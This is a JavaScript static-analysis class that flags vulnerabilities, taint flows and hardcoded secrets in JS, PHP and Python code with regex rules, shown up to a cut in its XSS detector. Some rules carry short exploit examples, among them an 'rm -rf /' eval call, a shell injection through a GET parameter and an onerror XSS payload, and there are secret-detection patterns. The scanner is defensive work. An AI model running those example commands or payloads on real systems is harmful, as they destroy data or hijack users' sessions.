export class AnalyzerService {
  constructor() {
    this.config = {
      maxFileSize: 500000,
      chunkSize: 300,
      overlap: 30,
      enableTaintAnalysis: true,
    };
  }

  analyze(code, language = "javascript") {
    if (!code || code.trim().length === 0) {
      return { issues: [], score: 100, summary: "Empty file" };
    }

    const lang = this.normalizeLanguage(language);
    const lines = code.split("\n");

    if (lines.length > this.config.chunkSize) {
      return this.analyzeLargeFile(code, lang);
    }

    return this.analyzeSmallFile(code, lang);
  }

  analyzeSmallFile(code, lang) {
    const lines = code.split("\n").map((text, i) => ({ text, number: i + 1 }));
    const issues = [];

    issues.push(...this.runSecurityRules(code, lines, lang));
    issues.push(...this.runVulnerabilityRules(code, lines, lang));
    issues.push(...this.runAdvancedSecurityRules(code, lines, lang));
    issues.push(...this.runFrameworkRules(code, lines, lang));
    issues.push(...this.runBestPracticeRules(code, lines, lang));
    issues.push(...this.runTaintAnalysis(code, lines, lang));
    issues.push(...this.runSecretsDetection(code, lines));
    issues.push(...this.runComplexityRules(code, lines, lang));

    const score = this.calculateScore(issues);

    return {
      issues: this.deduplicateIssues(issues),
      score,
      summary: this.generateSummary(issues, score),
    };
  }

  analyzeLargeFile(code, lang) {
    const chunks = this.chunkCode(code, lang);
    const allIssues = [];

    chunks.forEach((chunk) => {
      const chunkIssues = this.analyzeChunk(
        chunk.content,
        lang,
        chunk.startLine,
      );
      allIssues.push(...chunkIssues);
    });

    const score = this.calculateScore(allIssues);

    return {
      issues: this.deduplicateIssues(allIssues),
      score,
      summary: this.generateSummary(allIssues, score),
      isLargeFile: true,
      chunksAnalyzed: chunks.length,
    };
  }

  chunkCode(code, lang) {
    const lines = code.split("\n");
    const chunks = [];
    const splitPatterns = this.getSplitPatterns(lang);

    let currentChunk = { content: [], startLine: 1 };

    lines.forEach((line, idx) => {
      const isBoundary = splitPatterns.some((pattern) => pattern.test(line));

      if (isBoundary && currentChunk.content.length >= this.config.chunkSize) {
        chunks.push({
          content: currentChunk.content.join("\n"),
          startLine: currentChunk.startLine,
          endLine: idx,
        });

        const overlapStart = Math.max(
          0,
          currentChunk.content.length - this.config.overlap,
        );
        currentChunk = {
          content: currentChunk.content.slice(overlapStart),
          startLine: idx - this.config.overlap + 1,
        };
      }

      currentChunk.content.push(line);
    });

    if (currentChunk.content.length > 0) {
      chunks.push({
        content: currentChunk.content.join("\n"),
        startLine: currentChunk.startLine,
        endLine: lines.length,
      });
    }

    return chunks;
  }

  getSplitPatterns(lang) {
    const patterns = {
      javascript: [
        /^\s*(async\s+)?function\s+\w+/,
        /^\s*const\s+\w+\s*=\s*(async\s*)?\(/,
        /^\s*class\s+\w+/,
        /^\s*export\s+(default\s+)?/,
        /^\s*import\s+.*from/,
      ],
      php: [
        /^\s*(public|private|protected|static)?\s*function\s+\w+/,
        /^\s*class\s+\w+/,
        /^\s*if\s*\(|^\s*foreach\s*\(|^\s*while\s*\(/,
      ],
      python: [
        /^\s*def\s+\w+\s*\(/,
        /^\s*class\s+\w+/,
        /^\s*if\s+.*:|^\s*for\s+.*:|^\s*while\s+.*:/,
        /^\s*try\s*:|^\s*except\s+.*:/,
      ],
    };
    return patterns[lang] || patterns.javascript;
  }

  analyzeChunk(content, lang, startLine) {
    const lines = content.split("\n").map((text, i) => ({
      text,
      number: startLine + i,
    }));

    const issues = [];
    issues.push(...this.runSecurityRules(content, lines, lang));
    issues.push(...this.runVulnerabilityRules(content, lines, lang));
    issues.push(...this.runSecretsDetection(content, lines));

    return issues;
  }

  normalizeLanguage(lang) {
    const map = {
      javascript: "javascript",
      js: "javascript",
      jsx: "javascript",
      typescript: "javascript",
      ts: "javascript",
      tsx: "javascript",
      php: "php",
      python: "python",
      py: "python",
    };
    return map[lang?.toLowerCase()] || "javascript";
  }

  runSecurityRules(code, lines, lang) {
    const issues = [];
    const rules = this.getSecurityRules(lang);

    rules.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, rule.multiline);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData && !this.isCommentLine(lineData.text)) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: rule.id,
            message: rule.message,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion: rule.suggestion,
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
          });
        }
      });
    });

    return issues;
  }

  runVulnerabilityRules(code, lines, lang) {
    const issues = [];
    const rules = this.getVulnerabilityRules(lang);

    rules.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, rule.multiline);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData && !this.isCommentLine(lineData.text)) {
          const variables = this.extractVariables(match[0], lang);

          issues.push({
            id: crypto.randomUUID(),
            ruleId: rule.id,
            message: rule.message,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "VULNERABILITY",
            suggestion: rule.suggestion,
            problematicCode: lineData.text.trim(),
            variables,
            context: this.getContext(lines, location.line),
            exploitScenario: rule.exploitScenario,
          });
        }
      });
    });

    return issues;
  }

  runAdvancedSecurityRules(code, lines, lang) {
    const issues = [];

    // XSS detection with context
    if (lang === "javascript") {
      issues.push(...this.detectXSS(code, lines));
      issues.push(...this.detectPrototypePollution(code, lines));
      issues.push(...this.detectDependencyConfusion(code, lines));
    }

    if (lang === "php") {
      issues.push(...this.detectPHPRCE(code, lines));
      issues.push(...this.detectPHPFileInclusion(code, lines));
      issues.push(...this.detectPHPSerialization(code, lines));
    }

    if (lang === "python") {
      issues.push(...this.detectPythonRCE(code, lines));
      issues.push(...this.detectPythonDeserialization(code, lines));
      issues.push(...this.detectPythonPathTraversal(code, lines));
    }

    return issues;
  }

  runFrameworkRules(code, lines, lang) {
    const issues = [];
    const framework = this.detectFramework(code, lang);

    if (framework === "react") {
      issues.push(...this.detectReactVulnerabilities(code, lines));
    }
    if (framework === "laravel") {
      issues.push(...this.detectLaravelVulnerabilities(code, lines));
    }
    if (framework === "django") {
      issues.push(...this.detectDjangoVulnerabilities(code, lines));
    }

    return issues;
  }

  runBestPracticeRules(code, lines, lang) {
    const issues = [];
    const rules = this.getBestPracticeRules(lang);

    rules.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, rule.multiline);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData && !this.isCommentLine(lineData.text)) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: rule.id,
            message: rule.message,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "BEST_PRACTICE",
            suggestion: rule.suggestion,
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
          });
        }
      });
    });

    return issues;
  }

  runTaintAnalysis(code, lines, lang) {
    const issues = [];
    const sources = this.getTaintSources(lang);
    const sinks = this.getTaintSinks(lang);

    lines.forEach((line) => {
      const trimmed = line.text.trim();
      if (this.isCommentLine(trimmed)) return;

      // Check if line has both source and sink
      const hasSource = sources.some((s) => s.pattern.test(trimmed));
      const hasSink = sinks.some((s) => s.pattern.test(trimmed));

      if (hasSource && hasSink) {
        const sink = sinks.find((s) => s.pattern.test(trimmed));
        issues.push({
          id: crypto.randomUUID(),
          ruleId: "taint-analysis",
          message: `Potential taint flow: User input reaches ${sink.name}`,
          line: line.number,
          column: 0,
          severity: "HIGH",
          category: "SECURITY",
          suggestion: sink.suggestion,
          problematicCode: trimmed,
          context: this.getContext(lines, line.number),
        });
      }
    });

    return issues;
  }

  runSecretsDetection(code, lines) {
    const issues = [];
    const patterns = [
      {
        pattern: /['"`](AIza[0-9A-Za-z_-]{35})['"`]/,
        name: "Google API Key",
        severity: "CRITICAL",
      },
      {
        pattern: /['"`](sk-proj-[0-9A-Za-z_-]{100,})['"`]/,
        name: "OpenAI Project Key",
        severity: "CRITICAL",
      },
      {
        pattern: /['"`](sk-[0-9A-Za-z_-]{48})['"`]/,
        name: "OpenAI API Key",
        severity: "CRITICAL",
      },
      {
        pattern: /['"`](ghp_[0-9A-Za-z]{36})['"`]/,
        name: "GitHub Token",
        severity: "CRITICAL",
      },
      {
        pattern: /['"`](glpat-[0-9A-Za-z_-]{20})['"`]/,
        name: "GitLab Token",
        severity: "CRITICAL",
      },
      {
        pattern: /['"`](AKIA[0-9A-Z]{16})['"`]/,
        name: "AWS Access Key",
        severity: "CRITICAL",
      },
      {
        pattern: /['"`][0-9a-f]{32}['"`]/,
        name: "Possible API Key (32 hex)",
        severity: "HIGH",
      },
      {
        pattern: /['"`][0-9a-f]{40}['"`]/,
        name: "Possible Secret (40 hex)",
        severity: "HIGH",
      },
      {
        pattern: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/,
        name: "Private Key",
        severity: "CRITICAL",
      },
      {
        pattern:
          /['"`]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['"`]/,
        name: "UUID (possible key)",
        severity: "MEDIUM",
      },
      {
        pattern: /password\s*[:=]\s*['"`][^'"`]{6,}['"`]/i,
        name: "Hardcoded Password",
        severity: "CRITICAL",
      },
      {
        pattern: /secret\s*[:=]\s*['"`][^'"`]{6,}['"`]/i,
        name: "Hardcoded Secret",
        severity: "CRITICAL",
      },
      {
        pattern: /token\s*[:=]\s*['"`][^'"`]{6,}['"`]/i,
        name: "Hardcoded Token",
        severity: "CRITICAL",
      },
      {
        pattern: /api[_-]?key\s*[:=]\s*['"`][^'"`]{6,}['"`]/i,
        name: "Hardcoded API Key",
        severity: "CRITICAL",
      },
      { pattern: /slack.*token/i, name: "Slack Token", severity: "CRITICAL" },
      {
        pattern: /discord.*token/i,
        name: "Discord Token",
        severity: "CRITICAL",
      },
      { pattern: /stripe.*key/i, name: "Stripe Key", severity: "CRITICAL" },
      { pattern: /twilio.*sid/i, name: "Twilio SID", severity: "CRITICAL" },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: "detect-secrets",
            message: `Potential hardcoded ${rule.name} detected`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion: `Move ${rule.name} to environment variables or secure vault`,
            problematicCode: this.maskSecret(lineData.text.trim()),
            context: this.getContext(lines, location.line),
          });
        }
      });
    });

    return issues;
  }

  runComplexityRules(code, lines, lang) {
    const issues = [];

    // Deep nesting detection
    let maxDepth = 0;
    let maxDepthLine = 0;
    let currentDepth = 0;

    lines.forEach((line) => {
      const openers = (line.text.match(/\{|\(|\[/g) || []).length;
      const closers = (line.text.match(/\}|\)|\]/g) || []).length;

      currentDepth += openers - closers;

      if (currentDepth > maxDepth) {
        maxDepth = currentDepth;
        maxDepthLine = line.number;
      }
    });

    const threshold = lang === "python" ? 5 : 6;
    if (maxDepth > threshold) {
      issues.push({
        id: crypto.randomUUID(),
        ruleId: "deep-nesting",
        message: `Deep nesting detected (${maxDepth} levels)`,
        line: maxDepthLine,
        column: 0,
        severity: "MEDIUM",
        category: "COMPLEXITY",
        suggestion: "Refactor into smaller functions or use early returns",
        problematicCode:
          lines.find((l) => l.number === maxDepthLine)?.text.trim() || "",
        context: this.getContext(lines, maxDepthLine),
      });
    }

    // Long function detection
    const functionBoundaries = this.detectFunctionBoundaries(lines, lang);
    functionBoundaries.forEach((func) => {
      if (func.length > 50) {
        issues.push({
          id: crypto.randomUUID(),
          ruleId: "long-function",
          message: `Function '${func.name}' is too long (${func.length} lines)`,
          line: func.startLine,
          column: 0,
          severity: "LOW",
          category: "COMPLEXITY",
          suggestion: "Split into smaller, focused functions",
          problematicCode: func.signature || "",
          context: this.getContext(lines, func.startLine),
        });
      }
    });

    return issues;
  }

  getSecurityRules(lang) {
    const baseRules = [
      {
        id: "no-eval",
        pattern: /\beval\s*\(/,
        message: "Usage of eval() detected - code injection risk",
        severity: "CRITICAL",
        suggestion:
          "Use JSON.parse() for data, or function maps for dynamic execution",
        exploitScenario:
          "Attacker can execute arbitrary code: eval('rm -rf /')",
      },
      {
        id: "no-implied-eval",
        pattern: /\bnew\s+Function\s*\(/,
        message: "Implied eval via Function constructor",
        severity: "CRITICAL",
        suggestion: "Avoid dynamic code execution",
      },
      {
        id: "no-settimeout-string",
        pattern: /setTimeout\s*\(\s*['"`]/,
        message: "setTimeout/setInterval with string argument",
        severity: "HIGH",
        suggestion: "Use function references: setTimeout(fn, delay)",
      },
    ];

    const jsRules = [
      ...baseRules,
      {
        id: "no-innerhtml",
        pattern: /\.innerHTML\s*[=+]/,
        message: "XSS vulnerability via innerHTML assignment",
        severity: "CRITICAL",
        suggestion: "Use textContent or DOMPurify.sanitize()",
        exploitScenario: "element.innerHTML = '<img src=x onerror=alert(1)>'",
      },
      {
        id: "no-dangerouslysetinnerhtml",
        pattern: /dangerouslySetInnerHTML/,
        message: "React XSS via dangerouslySetInnerHTML",
        severity: "CRITICAL",
        suggestion: "Use JSX rendering or sanitize HTML with DOMPurify",
      },
      {
        id: "no-document-write",
        pattern: /document\.write\s*\(/,
        message: "document.write can cause XSS",
        severity: "HIGH",
        suggestion: "Use DOM methods: createElement, appendChild",
      },
      {
        id: "insecure-random",
        pattern: /Math\.random\s*\(/,
        message: "Math.random() not cryptographically secure",
        severity: "MEDIUM",
        suggestion: "Use crypto.getRandomValues() for security purposes",
      },
      {
        id: "no-postmessage-origin",
        pattern: /postMessage\s*\([^,]+,\s*['"`][\*]/,
        message: "postMessage with wildcard origin",
        severity: "HIGH",
        suggestion: "Specify exact target origin",
      },
      {
        id: "no-window-name",
        pattern: /window\.name/,
        message: "window.name can be poisoned across origins",
        severity: "MEDIUM",
        suggestion: "Don't trust window.name for sensitive data",
      },
      {
        id: "no-localstorage-secrets",
        pattern:
          /localStorage\.(setItem|\.\w+\s*=).*\b(token|password|secret|key)/i,
        message: "Storing sensitive data in localStorage",
        severity: "HIGH",
        suggestion: "Use httpOnly cookies or secure storage",
      },
      {
        id: "no-cors-wildcard",
        pattern: /['"]\*['"]\s*:\s*true|Access-Control-Allow-Origin.*\*/,
        message: "CORS wildcard configuration",
        severity: "MEDIUM",
        suggestion: "Restrict to specific origins",
      },
    ];

    const phpRules = [
      ...baseRules,
      {
        id: "no-mysql-query",
        pattern: /\bmysql(i)?_query\s*\(/,
        message: "Direct SQL query - injection risk",
        severity: "CRITICAL",
        suggestion: "Use PDO with prepared statements",
      },
      {
        id: "no-exec",
        pattern: /\b(exec|system|shell_exec|passthru|popen|proc_open)\s*\(/,
        message: "Command execution function - RCE risk",
        severity: "CRITICAL",
        suggestion: "Use escapeshellarg() or avoid shell execution",
        exploitScenario:
          "system('rm -rf ' + $_GET['file']) allows arbitrary command execution",
      },
      {
        id: "no-file-get-contents-url",
        pattern: /file_get_contents\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/,
        message: "SSRF via file_get_contents with user input",
        severity: "HIGH",
        suggestion: "Validate and whitelist URLs",
      },
      {
        id: "no-unserialize",
        pattern: /\bunserialize\s*\(/,
        message: "Object injection via unserialize",
        severity: "CRITICAL",
        suggestion: "Use json_decode() or validate serialized data",
        exploitScenario: "PHP object injection leading to RCE",
      },
      {
        id: "no-include-user-input",
        pattern:
          /\b(include|require)(_once)?\s*\(?\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)/,
        message: "LFI/RFI via include with user input",
        severity: "CRITICAL",
        suggestion: "Use hardcoded paths or strict whitelist",
      },
      {
        id: "no-preg-eval",
        pattern: /preg_replace\s*\([^)]*['"]\/e['"`]/,
        message: "preg_replace with /e modifier - code execution",
        severity: "CRITICAL",
        suggestion: "Use preg_replace_callback() instead",
      },
      {
        id: "no-assert",
        pattern: /\bassert\s*\(/,
        message: "assert() with dynamic input - code execution",
        severity: "CRITICAL",
        suggestion: "Remove assert() in production or validate input",
      },
      {
        id: "no-extract",
        pattern: /\bextract\s*\(/,
        message: "extract() can overwrite variables",
        severity: "HIGH",
        suggestion: "Avoid extract(), access array directly",
      },
      {
        id: "no-parse-str",
        pattern: /\bparse_str\s*\(/,
        message: "parse_str() without second argument pollutes scope",
        severity: "MEDIUM",
        suggestion: "Use parse_str($str, $result) form",
      },
      {
        id: "no-mb-ereg-eval",
        pattern: /mb_ereg_replace\s*\([^)]*['"]e['"`]/,
        message: "mb_ereg_replace with e modifier - code execution",
        severity: "CRITICAL",
        suggestion: "Use mb_ereg_replace_callback()",
      },
      {
        id: "no-create-function",
        pattern: /\bcreate_function\s*\(/,
        message: "create_function() is deprecated and unsafe",
        severity: "CRITICAL",
        suggestion: "Use anonymous functions: function() {}",
      },
      {
        id: "no-phpinfo",
        pattern: /\bphpinfo\s*\(/,
        message: "phpinfo() exposes sensitive information",
        severity: "MEDIUM",
        suggestion: "Remove phpinfo() calls from production",
      },
      {
        id: "no-error-reporting-display",
        pattern:
          /error_reporting\s*\(\s*E_ALL\s*\)|display_errors\s*\(\s*1\s*\)|ini_set\s*\(\s*['"]display_errors['"],\s*(1|true|['"]on['"])/i,
        message: "Displaying errors in production",
        severity: "MEDIUM",
        suggestion: "Set display_errors = Off in production",
      },
    ];

    const pythonRules = [
      ...baseRules,
      {
        id: "no-pickle-load",
        pattern: /pickle\.loads?\s*\(/,
        message: "pickle deserialization - arbitrary code execution",
        severity: "CRITICAL",
        suggestion: "Use json.loads() or validate pickle data",
      },
      {
        id: "no-yaml-load",
        pattern: /yaml\.load\s*\([^)]*\)(?!.*Loader)/,
        message: "yaml.load without Loader - arbitrary code execution",
        severity: "CRITICAL",
        suggestion: "Use yaml.safe_load()",
      },
      {
        id: "no-marshal-load",
        pattern: /marshal\.loads?\s*\(/,
        message: "marshal deserialization - arbitrary code execution",
        severity: "CRITICAL",
        suggestion: "Use json for serialization",
      },
      {
        id: "no-subprocess-shell",
        pattern:
          /subprocess\.(call|run|Popen|check_output)\s*\([^)]*shell\s*=\s*True/,
        message: "subprocess with shell=True - command injection",
        severity: "CRITICAL",
        suggestion: "Use shell=False with list arguments",
      },
      {
        id: "no-os-system",
        pattern: /\bos\.system\s*\(/,
        message: "os.system() - command injection risk",
        severity: "CRITICAL",
        suggestion: "Use subprocess with shell=False",
      },
      {
        id: "no-exec-builtins",
        pattern: /\b(exec|compile)\s*\(/,
        message: "Dynamic code execution",
        severity: "CRITICAL",
        suggestion: "Avoid exec(), use safer alternatives",
      },
      {
        id: "no-unsanitized-format",
        pattern: /\.format\s*\(\s*\*\*|%\s*\*\*|f['"].*\{.*\}/,
        message: "Potential format string vulnerability",
        severity: "HIGH",
        suggestion: "Validate format strings, avoid user-controlled formats",
      },
      {
        id: "no-tempfile-mktemp",
        pattern: /tempfile\.mktemp\s*\(/,
        message: "mktemp() is insecure - race condition",
        severity: "HIGH",
        suggestion: "Use tempfile.mkstemp() or NamedTemporaryFile",
      },
      {
        id: "no-django-raw-sql",
        pattern: /\.raw\s*\(|cursor\.execute\s*\([^)]*%/,
        message: "Django raw SQL with string formatting",
        severity: "CRITICAL",
        suggestion: "Use parameterized queries",
      },
      {
        id: "no-ssl-verify-false",
        pattern: /verify\s*=\s*False/,
        message: "SSL certificate verification disabled",
        severity: "HIGH",
        suggestion: "Set verify=True or specify CA bundle",
      },
      {
        id: "no-debug-true",
        pattern: /DEBUG\s*=\s*True/,
        message: "DEBUG mode enabled in Django/Flask",
        severity: "MEDIUM",
        suggestion: "Set DEBUG = False in production",
      },
      {
        id: "no-assert-production",
        pattern: /\bassert\s+.*,/,
        message: "assert statements can be optimized away",
        severity: "LOW",
        suggestion: "Use proper error handling for production",
      },
    ];

    const rules = {
      javascript: jsRules,
      php: phpRules,
      python: pythonRules,
    };

    return rules[lang] || jsRules;
  }

  getVulnerabilityRules(lang) {
    const rules = {
      javascript: [
        {
          id: "prototype-pollution",
          pattern:
            /\.__proto__|\.constructor\.prototype|\[\s*['"]__proto__['"]\s*\]/,
          message: "Prototype pollution vulnerability",
          severity: "HIGH",
          suggestion: "Use Object.freeze() or avoid modifying prototypes",
          exploitScenario:
            "Attacker can pollute Object.prototype affecting all objects",
        },
        {
          id: "path-traversal",
          pattern: /res\.sendFile\s*\(|fs\.readFile\s*\([^)]*\+\s*req\./,
          message: "Path traversal via user input",
          severity: "HIGH",
          suggestion: "Use path.resolve() with strict base path validation",
        },
        {
          id: "open-redirect",
          pattern: /res\.redirect\s*\(\s*req\.|window\.location\s*=\s*.*req\./,
          message: "Open redirect vulnerability",
          severity: "MEDIUM",
          suggestion: "Whitelist allowed redirect URLs",
        },
        {
          id: "no-loose-equality",
          pattern: /(?<![=!])={2}(?![=])/,
          message: "Loose equality operator (==) can cause type coercion bugs",
          severity: "LOW",
          suggestion: "Use strict equality (===)",
        },
        {
          id: "no-delete-property",
          pattern: /delete\s+\w+\[/,
          message: "Deleting object properties can cause performance issues",
          severity: "INFO",
          suggestion: "Set to undefined or use Map/Set",
        },
      ],
      php: [
        {
          id: "weak-comparison",
          pattern: /\$\w+\s*==\s*['"`\d]|['"`\d]\s*==\s*\$\w+/,
          message: "Weak type comparison (==) - type juggling risk",
          severity: "HIGH",
          suggestion: "Use strict comparison (===)",
          exploitScenario: "'0e123' == '0' evaluates to true in PHP",
        },
        {
          id: "no-mass-assignment",
          pattern:
            /\$\w+->save\s*\(\s*\$_(POST|GET|REQUEST)|Model::create\s*\(\s*\$_(POST|GET|REQUEST)/,
          message: "Mass assignment vulnerability",
          severity: "HIGH",
          suggestion: "Whitelist allowed fields before saving",
        },
        {
          id: "no-xee",
          pattern: /LIBXML_NOENT|simplexml_load_string.*LIBXML/,
          message: "XML External Entity (XXE) processing enabled",
          severity: "CRITICAL",
          suggestion: "Disable external entity loading",
        },
        {
          id: "session-fixation",
          pattern: /session_id\s*\(\s*\$_/,
          message: "Session fixation via user-controlled session ID",
          severity: "MEDIUM",
          suggestion: "Regenerate session ID after authentication",
        },
      ],
      python: [
        {
          id: "no-eval-input",
          pattern: /eval\s*\(\s*input\s*\(|eval\s*\(\s*request\./,
          message: "eval() with user input - arbitrary code execution",
          severity: "CRITICAL",
          suggestion: "Use ast.literal_eval() for safe evaluation",
        },
        {
          id: "no-string-format-sql",
          pattern:
            /\.execute\s*\(\s*['"].*%.*['"]\s*%|\.execute\s*\(\s*f['"].*\{/,
          message: "SQL injection via string formatting",
          severity: "CRITICAL",
          suggestion: "Use parameterized queries with ? placeholders",
        },
        {
          id: "no-mktemp-insecure",
          pattern: /mktemp\s*\(|tempfile\.mktemp/,
          message: "Insecure temporary file creation",
          severity: "HIGH",
          suggestion: "Use tempfile.mkstemp() instead",
        },
        {
          id: "no-shelve-untrusted",
          pattern: /shelve\.open\s*\([^)]*\)/,
          message: "shelve with untrusted data - pickle execution",
          severity: "CRITICAL",
          suggestion: "Don't use shelve with untrusted data",
        },
      ],
    };

    return rules[lang] || [];
  }

  getBestPracticeRules(lang) {
    const common = [
      {
        id: "no-console",
        pattern: /console\.(log|warn|error|info|debug)\s*\(/,
        message: "Console statement in production code",
        severity: "LOW",
        suggestion: "Use a logging library or remove debug statements",
      },
      {
        id: "todo-fixme",
        pattern: /\/\/.*TODO|\/\/.*FIXME|#.*TODO|#.*FIXME/,
        message: "TODO/FIXME comment found",
        severity: "INFO",
        suggestion: "Track technical debt in issue tracker",
      },
      {
        id: "max-line-length",
        pattern: /^.{161,}$/m,
        message: "Line exceeds 160 characters",
        severity: "LOW",
        suggestion: "Break into multiple lines for readability",
      },
    ];

    const langSpecific = {
      javascript: [
        ...common,
        {
          id: "no-var",
          pattern: /\bvar\s+/,
          message: "Use const or let instead of var",
          severity: "MEDIUM",
          suggestion: "Use const for immutable, let for mutable",
        },
        {
          id: "prefer-arrow",
          pattern: /function\s*\([^)]*\)\s*\{[^}]*\}/,
          message: "Consider arrow function for concise syntax",
          severity: "INFO",
          suggestion: "Use () => {} for simple functions",
        },
        {
          id: "no-throw-literal",
          pattern: /throw\s+['"`\d]|throw\s+\w+\s*[^;]*[^.]error/i,
          message: "Throwing non-Error objects",
          severity: "MEDIUM",
          suggestion: "Throw new Error('message')",
        },
        {
          id: "prefer-strict-equality",
          pattern: /\!=\s*null|\!=\s*undefined/,
          message: "Use !== for null/undefined checks",
          severity: "LOW",
          suggestion: "Use value !== null instead of value != null",
        },
      ],
      php: [
        ...common,
        {
          id: "no-short-tags",
          pattern: /<\?(?!php|=)/,
          message: "PHP short tags are deprecated",
          severity: "MEDIUM",
          suggestion: "Use <?php instead",
        },
        {
          id: "no-die-exit",
          pattern: /\b(die|exit)\s*\(/,
          message: "die() or exit() aborts abruptly",
          severity: "LOW",
          suggestion: "Throw exceptions for error handling",
        },
        {
          id: "no-at-operator",
          pattern: /@\$\w+/,
          message: "Error suppression operator @",
          severity: "LOW",
          suggestion: "Handle errors properly with try/catch",
        },
      ],
      python: [
        ...common,
        {
          id: "no-print",
          pattern: /\bprint\s*\(/,
          message: "print() in production code",
          severity: "LOW",
          suggestion: "Use logging module",
        },
        {
          id: "no-bare-except",
          pattern: /except\s*:\s*$/m,
          message: "Bare except clause catches all exceptions",
          severity: "MEDIUM",
          suggestion: "Use except SpecificException:",
        },
        {
          id: "no-mutable-default",
          pattern: /def\s+\w+\s*\([^)]*=\s*(\[\s*\]|\{\s*\})/,
          message: "Mutable default argument",
          severity: "MEDIUM",
          suggestion: "Use None as default, initialize inside function",
        },
      ],
    };

    return langSpecific[lang] || common;
  }

  getTaintSources(lang) {
    const sources = {
      javascript: [
        {
          pattern: /req\.(body|query|params|headers|cookies)/,
          name: "Express request input",
        },
        {
          pattern: /\$_(POST|GET|REQUEST|COOKIE|FILES|SERVER|ENV)/,
          name: "PHP superglobal",
        },
        {
          pattern: /request\.(POST|GET|FILES|COOKIES|META|headers)/,
          name: "Django request",
        },
        {
          pattern: /document\.(URL|location|cookie)/,
          name: "Browser document",
        },
        { pattern: /window\.name/, name: "Window name" },
        { pattern: /process\.argv/, name: "Command line args" },
      ],
      php: [
        {
          pattern: /\$_(GET|POST|REQUEST|COOKIE|FILES|SERVER|ENV)/,
          name: "Superglobal input",
        },
        {
          pattern: /file_get_contents\s*\(\s*['"]php:\/\/input['"]/,
          name: "PHP input stream",
        },
        { pattern: /php:\/\/stdin/, name: "Standard input" },
      ],
      python: [
        {
          pattern: /request\.(args|form|files|cookies|headers|json|data)/,
          name: "Flask/Django request",
        },
        { pattern: /sys\.argv/, name: "Command line arguments" },
        { pattern: /input\s*\(/, name: "User input" },
        { pattern: /os\.environ/, name: "Environment variables" },
      ],
    };

    return sources[lang] || sources.javascript;
  }

  getTaintSinks(lang) {
    const sinks = {
      javascript: [
        {
          pattern: /eval\s*\(/,
          name: "eval()",
          suggestion: "Use safer alternatives",
        },
        {
          pattern: /new\s+Function\s*\(/,
          name: "Function constructor",
          suggestion: "Avoid dynamic code",
        },
        {
          pattern: /\.innerHTML\s*=/,
          name: "innerHTML",
          suggestion: "Use textContent",
        },
        {
          pattern: /document\.write/,
          name: "document.write",
          suggestion: "Use DOM methods",
        },
        {
          pattern: /exec\s*\(/,
          name: "child_process.exec",
          suggestion: "Use execFile with args array",
        },
      ],
      php: [
        {
          pattern: /\b(eval|assert|preg_replace.*\/e)\s*\(/,
          name: "code execution",
          suggestion: "Avoid dynamic execution",
        },
        {
          pattern: /\b(mysql(i)?_query|pg_query)\s*\(/,
          name: "SQL query",
          suggestion: "Use prepared statements",
        },
        {
          pattern: /\b(system|exec|shell_exec|passthru|popen|proc_open)\s*\(/,
          name: "command execution",
          suggestion: "Escape arguments or use escapeshellarg",
        },
        {
          pattern: /\bunserialize\s*\(/,
          name: "unserialize",
          suggestion: "Use json_decode",
        },
        {
          pattern: /\b(include|require)(_once)?\s*\(/,
          name: "file inclusion",
          suggestion: "Validate paths strictly",
        },
        {
          pattern: /\becho\s+\$_(GET|POST|REQUEST|COOKIE)/,
          name: "XSS via echo",
          suggestion: "Use htmlspecialchars()",
        },
      ],
      python: [
        {
          pattern: /\b(eval|exec|compile)\s*\(/,
          name: "code execution",
          suggestion: "Use ast.literal_eval",
        },
        {
          pattern: /pickle\.loads?\s*\(/,
          name: "pickle load",
          suggestion: "Use json",
        },
        {
          pattern: /yaml\.load\s*\(/,
          name: "yaml load",
          suggestion: "Use yaml.safe_load",
        },
        {
          pattern: /\.execute\s*\(/,
          name: "SQL execute",
          suggestion: "Use parameterized queries",
        },
        {
          pattern: /subprocess\.(call|run|Popen)/,
          name: "subprocess",
          suggestion: "Use shell=False",
        },
        {
          pattern: /\.format\s*\(/,
          name: "string format",
          suggestion: "Use f-strings safely",
        },
        {
          pattern: /os\.system\s*\(/,
          name: "os.system",
          suggestion: "Use subprocess with list",
        },
      ],
    };

    return sinks[lang] || sinks.javascript;
  }

  detectXSS(code, lines) {
    const issues = [];
    const patterns = [
      { pattern: /\.innerHTML\s*[=+]/, type: "DOM XSS", severity: "CRITICAL" },
      {
        pattern: /document\.write\s*\(/,
        type: "document.write XSS",
        severity: "HIGH",
      },
      {
        pattern: /document\.writeln\s*\(/,
        type: "document.writeln XSS",
        severity: "HIGH",
      },
      { pattern: /\.outerHTML\s*=/, type: "outerHTML XSS", severity: "HIGH" },
      {
        pattern: /\.insertAdjacentHTML\s*\(/,
        type: "insertAdjacentHTML XSS",
        severity: "HIGH",
      },
      {
        pattern: /dangerouslySetInnerHTML/,
        type: "React XSS",
        severity: "CRITICAL",
      },
      { pattern: /v-html\s*=/, type: "Vue XSS", severity: "CRITICAL" },
      {
        pattern: /\[innerHTML\]\s*=/,
        type: "Angular innerHTML",
        severity: "HIGH",
      },
    ];

    patterns.forEach((rule) => {
